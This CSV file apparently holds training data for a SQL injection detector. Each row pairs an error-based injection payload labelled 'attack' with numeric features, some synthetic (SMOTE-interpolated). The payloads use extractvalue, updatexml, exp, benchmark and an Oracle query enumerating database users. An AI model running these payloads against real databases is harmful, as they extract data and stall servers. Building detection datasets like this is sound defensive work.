id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000056,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",nearest_attack_euclidean,R000102,0.9508199187045349,170.33228121479627,30.238245540743392,3.830358213261008,53.90596432594714,32.37929905182269,62.28526337776982,21.761754459256608,0.3169326018637597,0.18966207168413085,0.36564945681621724,0.12775586963589214,0.0,4.000000000000001,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,4.761754459256609,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.7617544592566081,0.0,0.0,0.0,1.7617544592566081,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2382455407433918,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.761754459256608
SMOTE_000057,attack,error,"1%""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000278,0.11311859211804276,188.34035139861118,28.0,3.4320899178480317,40.0,35.0,84.47228111888896,28.86807027972224,0.2124201455486256,0.1858676273550474,0.4484446591170246,0.15326756797930235,0.0,4.000000000000001,0.0,0.0,0.0,2.0,0.0,15.868070279722238,1.9999999999999998,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000058,attack,error,"1   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000014,1.0851311574737625,158.69633211648681,32.449388686081136,3.6814277854260564,50.0,23.0,65.79755474432454,19.89877737216227,0.3151781969838422,0.1449819706125674,0.4145241090795929,0.12531572332399749,0.4493886860811358,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,14.449388686081136,0.0,0.0,4.0,0.0,0.4493886860811359,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000059,attack,error,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000291,0.854627329302715,170.04173570895344,31.61859505453488,3.8841735277778167,44.567355490813924,44.52561978186048,59.948760436279045,21.0,0.26149149548016476,0.26265216318661677,0.3521835529694803,0.12367278836373818,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.61859505453488,0.0,0.0,5.381404945465119,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000060,attack,error,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000059,0.4618076932177987,139.0,25.711321526178686,3.6653625153383143,33.866035421463934,37.84528610471475,49.57735694764262,17.711321526178686,0.24364054260045998,0.2722682453576601,0.35667163271685337,0.12741957932502654,0.0,1.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.711321526178688,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000061,attack,error,"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",nearest_attack_euclidean,R000108,0.3789706196076253,146.17006587968493,29.098639358167496,3.738742791957748,50.47959037251244,24.0,54.394557432669984,17.295918074502488,0.34474262824369273,0.16448788566296696,0.3724745947457117,0.11829489134762863,0.0,1.295918074502488,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.09863935816749603,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.098639358167496
SMOTE_000062,attack,error,"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""gmld"" like ""gmld",nearest_attack_euclidean,R000043,0.04571524493661383,186.1980932403537,29.039618648070743,3.6829343138388686,49.059427972106114,38.920762703858514,73.19809324035371,25.01980932403537,0.26347780979905655,0.20906123070396887,0.3930871334254984,0.1343738260714762,0.0,4.000000000000001,0.0,0.0,0.0,1.0,0.0,14.039618648070743,0.0,0.0,5.980190675964629,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000063,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",nearest_attack_euclidean,R000155,0.015028872959443874,186.0,30.0,3.6551908656776146,51.96701687338925,35.04397750214767,74.97801124892617,24.010994375536917,0.27939256383542604,0.1884084811943423,0.40310758735981805,0.12909136761041354,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,14.0,0.0,0.0,5.010994375536917,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000064,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'kwhs' like 'kwhs",nearest_attack_euclidean,R000011,0.022550607038043777,192.99010225280068,31.970306758402074,3.739195049882367,58.96040901120277,32.0,77.01979549439862,25.009897747199307,0.30550903784129135,0.16581165608566434,0.39908739898945594,0.1295919070835883,4.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0098977471993087,0.0,14.0,0.0,0.0,4.0,2.0098977471993087,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000065,attack,error,"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",nearest_attack_euclidean,R000196,0.5338355729437877,190.0,26.632231730995482,3.408786983423721,37.10330480701356,45.52892692398193,83.73553653800903,23.632231730995482,0.19528055161586083,0.23962593117885225,0.4407133502000476,0.12438016700523938,0.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,16.0,0.0,0.0,5.632231730995482,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000066,attack,error,"1'+  (  select jidy where 2989  =  2989 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000173,0.2556425003886512,180.85767876083278,38.714419690208196,4.072206078898718,64.04806563402732,31.0,64.90480656340273,20.904806563402733,0.3539430777614364,0.17147420680071698,0.3589827302871741,0.11559998515067256,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,13.0,0.0,0.0,4.0,1.9048065634027322,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9048065634027322,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9048065634027322
SMOTE_000067,attack,error,"1  )   as lfra where 2669  =  2669 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000202,0.48152131080259286,169.7726055230791,30.0,3.848305897712476,43.04889485680574,47.0,59.04889485680574,20.674815809467624,0.2532926556916413,0.27720737989631195,0.34766112544357725,0.12183883896846953,0.0,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,10.674815809467624,0.0,0.0,6.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000068,attack,error,"1""   )    )    as rcse where 4559  =  4559 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000016,0.5927339234873558,177.09805259545496,31.0,3.822368808027594,46.52941577863648,43.0,66.05883155727297,21.509805259545494,0.2626389617124543,0.24341282520673713,0.3724373122485853,0.12151090083222328,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.509805259545494,0.0,0.0,5.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000069,attack,error,"1"" where 5353  =  5353 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000111,0.7300336223319137,192.70791265832582,33.0,3.7026987990360154,48.70791265832581,40.0,79.0,25.0,0.2527509559261366,0.20756917890940652,0.4099491283460779,0.12973073681837907,0.0,1.0,2.0,0.0,1.0,2.0,0.0,14.0,0.0,0.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.7079126583258112,0.2920873416741888,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000070,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000156,1.8059875903142093,141.13061933804138,24.447231334005913,3.6253729288512972,37.78892533602365,35.0,51.44723133400591,16.89446266801183,0.26757468266875434,0.24814734248718395,0.3646704816518093,0.11960749319225238,0.0,1.1102230246251565e-16,0.8944626680118284,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.0,1.8944626680118284,0.0,0.0,0.4472313340059142,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000071,attack,error,"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  1185  =  1185",nearest_attack_euclidean,R000286,0.9761243520640575,166.33999033301131,25.660009666988696,3.5861561620705196,38.32001933397739,44.359961332045216,64.32001933397738,19.339990333011304,0.23038971165330085,0.266652261626146,0.38669734643223835,0.11626068028831475,0.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.339990333011304,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.3399903330113045,0.6600096669886955,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000072,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  -- mwsm",nearest_attack_euclidean,R000172,0.7884198434246513,150.27626398543256,27.641439597814884,3.806337337488066,38.21381319927163,40.71050559417303,51.924318793444655,19.427626398543257,0.25485718334903534,0.270546275017222,0.3452359029778549,0.1293606386558878,0.0,1.1102230246251565e-16,2.0,0.0,0.0,1.2138131992716283,0.0,10.213813199271629,0.0,0.0,6.0,3.2138131992716286,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.21381319927162826,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.213813199271628
SMOTE_000073,attack,error,"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000160,0.9435075394885377,187.09239876486586,30.789865019821143,3.867902973729417,49.605067490089425,45.78986501982114,66.0,25.697466254955287,0.2651876120948357,0.24468521799245774,0.3527861323035898,0.13734103760911678,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.697466254955286,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.6974662549552858,0.30253374504471414,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000074,attack,error,"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  # fzni",nearest_attack_euclidean,R000026,0.7355034603758195,144.28353086556885,28.432938268862284,3.784736591808253,37.283530865568856,39.0,50.0,18.0,0.2583974043398404,0.2703037498200581,0.3465432690000746,0.12475557684002685,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.28353086556885765,0.7164691344311424,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000075,attack,error,"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000063,0.3703196906900213,141.13609931120823,25.0,3.6163787789549753,33.0,39.0,51.50887944896659,17.627219862241645,0.2338861215531635,0.27641087092646593,0.36483006474653823,0.12487294277383235,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.627219862241647,0.0,0.0,6.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000076,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000003,0.9844935094981258,145.13188215988632,38.552588262873385,4.115213946455483,71.6844704227597,1.0,53.0,19.447411737126618,0.49371844838830337,0.00689422997637365,0.36539418874780344,0.1339931328875196,3.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,8.0,0.0,3.8948234742532346,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000077,attack,error,"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000093,0.3298648072557409,176.8426395116201,31.736765784054274,3.855235820614949,48.0,43.0,64.57940529567436,21.263234215945726,0.27150873794167146,0.243226577739414,0.3650332696235776,0.1202314146953369,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.263234215945728,0.0,0.0,5.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000078,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000071,0.036954482248979355,194.0,27.91545691063127,3.481867715500945,47.0,35.0,85.0,27.0,0.2422680412371134,0.18041237113402062,0.4381443298969072,0.13917525773195877,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,16.0,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000079,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000167,0.34490355944684503,173.04502967376317,27.0,3.419072751836362,43.0,32.0,75.43602373901052,22.60900593475263,0.24853995711019106,0.18495996808200266,0.43586006283855727,0.13064001196924901,1.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,14.60900593475263,0.0,0.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000080,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000223,0.5750125893369916,140.0,26.373175479365095,3.707689354440991,35.11952643809529,37.50729808253961,49.74635095873019,17.6268245206349,0.2508537602721092,0.2679092720181401,0.35533107827664423,0.12590588943310643,1.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.626824520634902,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000081,attack,error,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000231,0.2620522389714306,164.10482279734578,27.0,3.66156544416515,36.10482279734579,39.0,63.0,26.0,0.22000803097044572,0.2376538030636923,0.38390229725673375,0.1584358687091282,0.0,4.000000000000001,0.0,0.0,0.0,2.0,0.0,12.0,1.9999999999999998,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1048227973457903,0.8951772026542097,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000082,attack,error,"1%""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000287,0.05534417035541079,158.1206190490849,33.96984523772878,3.753968692193304,50.0,23.0,64.1206190490849,21.0,0.31622007530652274,0.14546123464100047,0.4055062584237373,0.13281243162873954,0.0,1.0,0.0,0.0,0.0,0.0,0.0,14.030154762271222,0.9698452377287778,0.0,4.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000083,attack,error,"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",nearest_attack_euclidean,R000196,0.537536799524001,190.0,26.629681894001493,3.4085990493719405,37.110954317995514,45.51872757600598,83.74063621199701,23.629681894001497,0.1953208121999764,0.23957225040003147,0.44074019058945796,0.12436674681053418,0.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,16.0,0.0,0.0,5.629681894001495,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
